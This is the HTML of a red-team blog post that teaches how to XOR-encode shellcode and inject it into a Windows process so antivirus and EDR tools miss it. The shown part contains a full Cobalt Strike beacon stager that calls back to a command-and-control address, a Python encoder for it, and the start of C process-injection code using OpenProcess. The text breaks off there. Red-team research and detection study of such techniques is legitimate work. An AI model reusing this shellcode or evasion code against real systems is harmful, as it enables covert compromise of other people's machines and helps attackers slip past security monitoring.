<!doctype html>
<html lang="en-US">
<head class="no-js">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-38782884-3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-38782884-3');
</script>

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="profile" href="https://gmpg.org/xfn/11">
	        <link rel="pingback" href="https://shells.systems/xmlrpc.php">
	    <script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>In-Memory shellcode decoding to evade AVs/EDRs - Shells.Systems</title>

<!-- This site is optimized with the Yoast SEO plugin v12.1 - https://yoast.com/wordpress/plugins/seo/ -->
<link rel="canonical" href="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="In-Memory shellcode decoding to evade AVs/EDRs - Shells.Systems" />
<meta property="og:description" content="Estimated Reading Time:  9 minutes During the previous week, I was doing some research about win32 APIs and how we can use them during weaponizing our attack, I already did some work related to process injection in the past, but I was looking for something more advanced and to do an extra mile in process injection. So, I took my..." />
<meta property="og:url" content="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/" />
<meta property="og:site_name" content="Shells.Systems" />
<meta property="article:tag" content="beacon" />
<meta property="article:tag" content="cobalt strike" />
<meta property="article:tag" content="encoding" />
<meta property="article:tag" content="process injection" />
<meta property="article:tag" content="redteam" />
<meta property="article:tag" content="shellcode" />
<meta property="article:section" content="Red Team" />
<meta property="article:published_time" content="2020-07-26T15:12:17+00:00" />
<meta property="article:modified_time" content="2020-07-27T14:58:48+00:00" />
<meta property="og:updated_time" content="2020-07-27T14:58:48+00:00" />
<meta property="og:image" content="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png" />
<meta property="og:image:secure_url" content="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png" />
<meta property="og:image:width" content="651" />
<meta property="og:image:height" content="510" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Estimated Reading Time: 9 minutes During the previous week, I was doing some research about win32 APIs and how we can use them during weaponizing our attack, I already did some work related to process injection in the past, but I was looking for something more advanced and to do an extra mile in process injection. So, I took my..." />
<meta name="twitter:title" content="In-Memory shellcode decoding to evade AVs/EDRs - Shells.Systems" />
<meta name="twitter:site" content="@shellssystems" />
<meta name="twitter:image" content="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png" />
<meta name="twitter:creator" content="@shellssystems" />
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://shells.systems/#website","url":"https://shells.systems/","name":"Shells.Systems","publisher":{"@id":"https://shells.systems/#/schema/person/7cd79373b831de89bec6468407be4a51"},"potentialAction":{"@type":"SearchAction","target":"https://shells.systems/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"ImageObject","@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#primaryimage","url":"https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png","width":651,"height":510},{"@type":"WebPage","@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#webpage","url":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/","inLanguage":"en-US","name":"In-Memory shellcode decoding to evade AVs/EDRs - Shells.Systems","isPartOf":{"@id":"https://shells.systems/#website"},"primaryImageOfPage":{"@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#primaryimage"},"datePublished":"2020-07-26T15:12:17+00:00","dateModified":"2020-07-27T14:58:48+00:00"},{"@type":"Article","@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#article","isPartOf":{"@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#webpage"},"author":{"@id":"https://shells.systems/#/schema/person/2a512090a86b6e9f66c786be51718e2c"},"headline":"In-Memory shellcode decoding to evade AVs/EDRs","datePublished":"2020-07-26T15:12:17+00:00","dateModified":"2020-07-27T14:58:48+00:00","commentCount":"5","mainEntityOfPage":{"@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#webpage"},"publisher":{"@id":"https://shells.systems/#/schema/person/7cd79373b831de89bec6468407be4a51"},"image":{"@id":"https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/#primaryimage"},"keywords":"beacon,cobalt strike,encoding,process injection,redteam,shellcode","articleSection":"Red Team"},{"@type":["Person"],"@id":"https://shells.systems/#/schema/person/2a512090a86b6e9f66c786be51718e2c","name":"Askar","image":{"@type":"ImageObject","@id":"https://shells.systems/#authorlogo","url":"https://secure.gravatar.com/avatar/d6fbc3936f8273307f861bc80d82b490?s=96&d=mm&r=g","caption":"Askar"},"description":"I write codes that break codes, Hacker wannabe.","sameAs":[]}]}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Shells.Systems &raquo; Feed" href="https://shells.systems/feed/" />
<link rel="alternate" type="application/rss+xml" title="Shells.Systems &raquo; Comments Feed" href="https://shells.systems/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Shells.Systems &raquo; In-Memory shellcode decoding to evade AVs/EDRs Comments Feed" href="https://shells.systems/in-memory-shellcode-decoding-to-evade-avs/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/shells.systems\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.0.2"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-block-library-css'  href='https://shells.systems/wp-includes/css/dist/block-library/style.min.css?ver=5.0.2' type='text/css' media='all' />
<link rel='stylesheet' id='foobox-free-min-css'  href='https://shells.systems/wp-content/plugins/foobox-image-lightbox/free/css/foobox.free.min.css?ver=2.7.17' type='text/css' media='all' />
<link rel='stylesheet' id='thesimplest-google-fonts-css'  href='https://fonts.googleapis.com/css?family=Poppins%3A300%2C400%2C500%2C600%2C700%2C800%7CPT+Serif%3A400%2C400i%2C700%2C700i&#038;ver=5.0.2' type='text/css' media='all' />
<link rel='stylesheet' id='bootstrap-css'  href='https://shells.systems/wp-content/themes/thesimplest/assets/css/bootstrap.min.css?ver=3.3.7' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://shells.systems/wp-content/themes/thesimplest/assets/css/font-awesome.min.css?ver=4.7.0' type='text/css' media='all' />
<link rel='stylesheet' id='thesimplest-style-css'  href='https://shells.systems/wp-content/themes/thesimplest/style.css?ver=5.0.2' type='text/css' media='all' />
<script type='text/javascript' src='https://shells.systems/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://shells.systems/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* Run FooBox FREE (v2.7.17) */
var FOOBOX = window.FOOBOX = {
	ready: true,
	disableOthers: true,
	o: {wordpress: { enabled: true }, excludes:'.fbx-link,.nofoobox,.nolightbox,a[href*="pinterest.com/pin/create/button/"]', affiliate : { enabled: false }, error: "Could not load the item"},
	selectors: [
		".gallery", ".wp-block-gallery", ".wp-caption", ".wp-block-image", "a:has(img[class*=wp-image-])", ".foobox"
	],
	pre: function( $ ){
		// Custom JavaScript (Pre)
		
	},
	post: function( $ ){
		// Custom JavaScript (Post)
		
		// Custom Captions Code
		
	},
	custom: function( $ ){
		// Custom Extra JS
		
	}
};
</script>
<script type='text/javascript' src='https://shells.systems/wp-content/plugins/foobox-image-lightbox/free/js/foobox.free.min.js?ver=2.7.17'></script>
<link rel='https://api.w.org/' href='https://shells.systems/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://shells.systems/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://shells.systems/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.0.2" />
<link rel='shortlink' href='https://shells.systems/?p=1366' />
<link rel="alternate" type="application/json+oembed" href="https://shells.systems/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fshells.systems%2Fin-memory-shellcode-decoding-to-evade-avs%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://shells.systems/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fshells.systems%2Fin-memory-shellcode-decoding-to-evade-avs%2F&#038;format=xml" />
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #ffffff; }
</style>

</head>
<body class="post-template-default single single-post postid-1366 single-format-standard custom-background">
    <div class="search-popup">
        <span class="search-popup-close"><i class="fa fa-times"></i></span>
        
<form action="https://shells.systems/" method="get" role="search" id="searchform_topbar" class="search-top-bar-popup search-form">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field-top-bar" id="search-field-top-bar" placeholder="Search &hellip;" value="" name="s" />
	</label>
	<button type="submit" class="search-submit search-top-bar-submit" id="search-top-bar-submit">
        <span class="fa fa-search header-search-icon"></span>
        <span class="screen-reader-text">
            Search        </span>
    </button>
</form>
    </div><!-- .search-popup -->

<div id="page" class="site">
    <div class="site-inner">
        <a class="skip-link screen-reader-text" href="#content">Skip to content</a>

        <header id="masthead" class="site-header" role="banner">

                    <div class="container">
                <div class="header-links">
                                            <span class="btn-search fa fa-search icon-button-search"></span>
                    	                                </div><!-- .header-link -->
            </div>
        
        <div class="site-header-main">
            <div class="site-branding">
                                    <p class="site-title">
                        <a href="https://shells.systems/" rel="home">
                            Shells.Systems                        </a>
                    </p>
                                    <p class="site-description">WE POP SHELLS</p>
                
            </div><!-- .site-branding -->

            
        </div><!-- .site-header-main -->


    
</header>

        <div id="content" class="site-content container">


	<div id="primary" class="content-area row">
		<main id="main" class="site-main col-md-8 col-sm-12 col-md-offset-2" role="main">

			
<article id="post-1366" class="post-1366 post type-post status-publish format-standard has-post-thumbnail hentry category-red-team tag-beacon tag-cobalt-strike tag-encoding tag-process-injection tag-redteam tag-shellcode">

	<header class="entry-header">
		<h1 class="entry-title">In-Memory shellcode decoding to evade AVs/EDRs</h1>
		<div class="entry-info">
			<span class="posted-on">Posted on <time class="entry-date published" datetime="2020-07-26T15:12:17+00:00">2020-07-26</time><time class="updated" datetime="2020-07-27T14:58:48+00:00">2020-07-27</time></span><span class="author-info"> by <a href="https://shells.systems/author/askar/">Askar</a></span>		</div>
	</header>

	
		<div class="entry-thumbnail">
			<img width="651" height="510" src="https://shells.systems/wp-content/uploads/2020/07/Shellcode-Wrote-CreateRemoteThread.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" />		</div><!-- .post-thumbnail -->

	
	<div class="entry-content">
		<span class="rt-reading-time" style="display: block;"><span class="rt-label rt-prefix">Estimated Reading Time: </span> <span class="rt-time">9</span> <span class="rt-label rt-postfix">minutes</span></span>
<p>During the previous week, I was doing some research about <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">win32 APIs</a> and how we can use them during weaponizing our attack, I already did <a href="https://github.com/mhaskar/shellcode-process-injection">some work</a> related to process injection in the past, but I was looking for something more advanced and to do an extra mile in process injection.</p>



<p>So, I took my simple <a href="https://github.com/mhaskar/shellcode-process-injection">vanilla shellcode injection C implementation</a> and tried to take it to the next level by implementing a decoding routine for it and make sure that my shellcode will be written in the memory in an encoded way then it will be decoded later on runtime. </p>



<p>The vanilla process injection technique is very simple to use and to implement, you just need to Open the process you want, Allocate space on that process, Write your shellcode then execute it.</p>



<p>We will do almost the same thing here but I will encode my shellcode before by writing a simple python script to encode my shellcode, then, later on, we will let the C code decode that in runtime then write each byte in the memory after allocating the space we want.</p>



<p>Also, I will dig deeper inside some of WIn32 APIs and explain how each one is executed at low level.</p>



<h4>process injection 101</h4>



<p>As I mentioned before the vanilla process injection technique will do the following:</p>



<ul><li>Open a process and retrieve a <a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/handles-and-objects">HANDLE</a> for that process.</li><li>Allocate Space in the remote process (retrieve a memory address).</li><li>Write the data (shellcode) inside that process.</li><li>Execute the shellcode.</li></ul>



<p>We can perform these steps with a couple of Win32 APIs which are:</p>



<ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess()</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx()</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory()</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread()</a></li></ul>



<p>In the normal case, we will write the raw data &#8220;shellcode&#8221; directly to the memory as it is, but if the shellcode is detected by AVs/EDRs they will definitely raise an alert about that, so, we need to encode our shellcode and save it as encoded shellcode inside our binary, then, we need to decode it and write it to the memory to avoid detection.</p>



<h4>Shellcode encoding</h4>



<p>We need to encode our shellcode to avoid detection as  I mentioned before and to do that, we need to modify that shellcode in a reversible way that could be used to retrieve the original status of our shellcode, and we can do that by performing some changes on each opcode such as:</p>



<ul><li>XOR</li><li>ADD</li><li>Subtract</li><li>SWAP</li></ul>



<p>I will use XOR bitwise operation on each opcode of my shellcode, I will use Cobalt Strike beacon as my shellcode, and it will be the following shellcode:</p>


<pre class="brush: cpp; title: ; notranslate" title="">
/* length: 887 bytes */
unsigned char buf[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x56\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x35\x6e\x6b\x4f\x00\x03\x9a\xf4\xbb\xe0\xdd\x3e\x6c\x87\xa5\x05\x4b\x82\x51\x2f\xd5\x68\x67\x15\xd6\xfd\x10\xf3\xa5\x90\x60\xea\xba\xfe\x1f\x26\x2d\x04\xf3\xec\xcb\xd4\x73\x94\x57\x98\x5e\xde\xec\xb8\x3e\xd9\x4e\x32\xcc\x38\xe3\x94\x06\x1d\x73\x2d\xb3\xd4\x62\x26\xca\x5a\xae\x52\xef\xf4\xc0\x81\x77\x97\xce\xd5\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x47\x54\x42\x37\x2e\x34\x3b\x20\x49\x6e\x66\x6f\x50\x61\x74\x68\x2e\x32\x29\x0d\x0a\x00\x61\xe2\x49\x6c\xb5\x31\x92\x20\x19\xc9\xaa\x69\x2b\xbc\xc1\x8b\x28\xf9\x80\x6c\x92\xac\xba\xea\x06\x32\x05\xc2\x38\x1b\x0f\x3e\x85\x39\xc3\x8a\x12\x21\xe7\x51\x80\x80\x30\x02\xe7\xcc\x8f\x34\x38\xd1\xe2\x48\xf0\x28\x21\xe9\xd7\xa6\x47\x58\x0e\x48\x8c\x1d\x16\xad\x7d\xad\xbd\xa4\x40\x58\x4b\x5f\x3d\xa9\xd0\x55\x19\xdf\x43\xf1\x69\xba\x0c\x81\x6f\x91\x72\x94\xc6\x65\xb4\x8d\x5b\x04\x58\x68\x72\x93\xc3\xbc\x46\x11\x0b\xf8\x50\x26\x52\x15\x49\xdb\x36\x0d\x75\x5d\x81\x5d\x47\x1b\x0f\x5e\x25\x50\x34\x23\xc1\x69\xfd\x22\x75\x5d\xea\xa4\x2e\x40\x98\x12\x72\x8e\xd4\xde\xef\xf2\x42\xdd\x08\x6b\xa3\x74\x13\x6c\xa9\x82\xfc\x25\xec\xe6\x22\xea\x9b\x4b\x58\xa8\x85\x67\xa1\x78\x1e\xaa\x07\x31\xd7\xcf\x4a\x74\xf1\x30\x63\x3e\x0e\x5c\x17\x53\x2f\x69\x67\x92\xf8\x28\xfe\xd6\x6f\xce\x06\xc5\xdd\xb2\x0d\x71\xf4\xda\x18\x5e\x26\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x30\x2e\x30\x2e\x31\x00\x58\x56\x3d\xd2&quot;;
</pre>



<p>And the following code will be our encoder:</p>


<pre class="brush: python; title: ; notranslate" title="">
#!/usr/bin/python

import sys

raw_data = &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x56\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x35\x6e\x6b\x4f\x00\x03\x9a\xf4\xbb\xe0\xdd\x3e\x6c\x87\xa5\x05\x4b\x82\x51\x2f\xd5\x68\x67\x15\xd6\xfd\x10\xf3\xa5\x90\x60\xea\xba\xfe\x1f\x26\x2d\x04\xf3\xec\xcb\xd4\x73\x94\x57\x98\x5e\xde\xec\xb8\x3e\xd9\x4e\x32\xcc\x38\xe3\x94\x06\x1d\x73\x2d\xb3\xd4\x62\x26\xca\x5a\xae\x52\xef\xf4\xc0\x81\x77\x97\xce\xd5\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x3b\x20\x47\x54\x42\x37\x2e\x34\x3b\x20\x49\x6e\x66\x6f\x50\x61\x74\x68\x2e\x32\x29\x0d\x0a\x00\x61\xe2\x49\x6c\xb5\x31\x92\x20\x19\xc9\xaa\x69\x2b\xbc\xc1\x8b\x28\xf9\x80\x6c\x92\xac\xba\xea\x06\x32\x05\xc2\x38\x1b\x0f\x3e\x85\x39\xc3\x8a\x12\x21\xe7\x51\x80\x80\x30\x02\xe7\xcc\x8f\x34\x38\xd1\xe2\x48\xf0\x28\x21\xe9\xd7\xa6\x47\x58\x0e\x48\x8c\x1d\x16\xad\x7d\xad\xbd\xa4\x40\x58\x4b\x5f\x3d\xa9\xd0\x55\x19\xdf\x43\xf1\x69\xba\x0c\x81\x6f\x91\x72\x94\xc6\x65\xb4\x8d\x5b\x04\x58\x68\x72\x93\xc3\xbc\x46\x11\x0b\xf8\x50\x26\x52\x15\x49\xdb\x36\x0d\x75\x5d\x81\x5d\x47\x1b\x0f\x5e\x25\x50\x34\x23\xc1\x69\xfd\x22\x75\x5d\xea\xa4\x2e\x40\x98\x12\x72\x8e\xd4\xde\xef\xf2\x42\xdd\x08\x6b\xa3\x74\x13\x6c\xa9\x82\xfc\x25\xec\xe6\x22\xea\x9b\x4b\x58\xa8\x85\x67\xa1\x78\x1e\xaa\x07\x31\xd7\xcf\x4a\x74\xf1\x30\x63\x3e\x0e\x5c\x17\x53\x2f\x69\x67\x92\xf8\x28\xfe\xd6\x6f\xce\x06\xc5\xdd\xb2\x0d\x71\xf4\xda\x18\x5e\x26\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x30\x2e\x30\x2e\x31\x00\x58\x56\x3d\xd2&quot;

new_shellcode = []
for opcode in raw_data:
        new_opcode = (ord(opcode) ^ 0x01)
        new_shellcode.append(new_opcode)


print &quot;&quot;.join([&quot;\\x{0}&quot;.format(hex(abs(i)).replace(&quot;0x&quot;, &quot;&quot;)) for i in new_shellcode])

</pre>



<p>This script will read each opcode of our shellcode then it will xor it with the byte 0x01 which is our key in this case, then it will append each encoded opcode into a new list and finally, it will print it as a shellcode like the following:</p>



<figure class="wp-block-image"><img src="https://shells.systems/wp-content/uploads/2020/07/shellcode-encoder.png" alt="" class="wp-image-1375"/></figure>



<p>We got the encoded shellcode after running the script, we are ready now to move on.</p>



<p>We will now start implementing the C code that will perform the shellcode injection for us, I will walk through every win32 API to explain that.</p>



<h4>Open process and retrieve a handle</h4>



<p>We need to choose a process to inject our shellcode to it, and to do that, we need to retrieve a handle for that process so we can perform some actions on it, and to do that, we will use OpenProcess win32 API using the following code:</p>


<pre class="brush: cpp; title: ; notranslate" title="">
#include &amp;lt;windows.h&amp;gt;


int main(int argc, char *argv[]){

  // The PID that you want to use
  // You can use GetCurrentProcessId() to get the current PID
  int process_id = atoi(argv[1]);

  // Declare a new handle as process variable
  // PROCESS_ALL_ACCESS
  HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);

  // If the operation succeeded it will return the handle
  if(process){
    printf(&amp;quot;[+] Handle retrieved successfully!\n&amp;quot;);

    // We can print it as pointer using printf
    printf(&amp;quot;[+] Handle value is %p\n&amp;quot;, process);
  }else{
    printf(&amp;quot;[-] Enable to retrieve process handle\n&amp;quot;);
  }

}
</pre>



